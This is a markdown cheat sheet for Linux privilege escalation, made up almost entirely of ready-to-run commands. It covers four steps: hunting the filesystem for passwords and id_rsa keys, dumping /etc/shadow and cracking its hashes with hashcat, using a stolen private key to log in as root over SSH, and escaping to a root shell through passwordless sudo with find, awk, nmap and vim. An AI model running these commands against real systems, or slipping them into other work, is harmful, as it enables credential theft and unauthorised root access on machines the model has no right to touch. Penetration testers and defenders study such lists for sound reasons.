- [1. Search Stored Passwords from Config Files](#1-search-stored-passwords-from-config-files)
- [2. Fetching Passwords from /etc/shadow](#2-fetching-passwords-from-etcshadow)
- [3. Escalate Privileges with SSH Key](#3-escalate-privileges-with-ssh-key)
- [4. Shell Escaping via Sudo](#4-shell-escaping-via-sudo)

## 1. Search Stored Passwords from Config Files
### Commands to Find Passwords and SSH Keys
- Search for all config files:
  ```sh
  find / -type f -name "config" 2>/dev/null
  ```
- Search for files containing the word "password":
  ```sh
  find / -type f -exec grep -il "password" {} 2>/dev/null \;
  ```
- Search for config files containing the word "password":
  ```sh
  find / -type f -name "config" -exec grep -il "password" {} 2>/dev/null \;
  ```
- Search for SSH keys:
  ```sh
  find / -name id_rsa 2>/dev/null
  ```
- Search command history for "password":
  ```sh
  history | grep -i "password"
  ```

## 2. Fetching Passwords from /etc/shadow
### Steps to Extract and Crack Password Hashes
1. Extract the `/etc/passwd` file:
   ```sh
   cat /etc/passwd
   ```
   Save output to `passwd.txt`.
2. Extract the `/etc/shadow` file:
   ```sh
   cat /etc/shadow
   ```
   Save output to `shadow.txt`.
3. Combine `passwd.txt` and `shadow.txt` into an unshadowed file:
   ```sh
   unshadow passwd.txt shadow.txt > unshadow.txt
   ```
4. Crack the hashes using Hashcat with the `rockyou.txt` wordlist:
   ```sh
   hashcat -m 1800 unshadow.txt rockyou.txt -O
   ```

## 3. Escalate Privileges with SSH Key
### Steps to Gain Root Access Using SSH Keys
1. Locate `authorized_keys` or `id_rsa` files:
   ```sh
   find / -name authorized_keys 2>/dev/null
   ```
   or
   ```sh
   find / -name id_rsa 2>/dev/null
   ```
2. Save the `id_rsa` file to your machine.
3. Set appropriate permissions for the `id_rsa` file:
   ```sh
   chmod 400 id_rsa
   ```
4. Attempt to access the root shell on the target machine:
   ```sh
   ssh -i id_rsa root@<target-ip>
   ```

## 4. Shell Escaping via Sudo
### Steps to Escalate Privileges Using Sudo
1. Check for sudo permissions:
   ```sh
   sudo -l
   ```
   Output will show commands that can be run as root without a password.
2. Exploit passwordless sudo access to gain a root shell using one of the following:
   ```sh
   sudo find /bin -name nano -exec /bin/sh \;
   sudo awk 'BEGIN {system("/bin/sh")}'
   echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
   sudo vim -c '!sh'
   ```
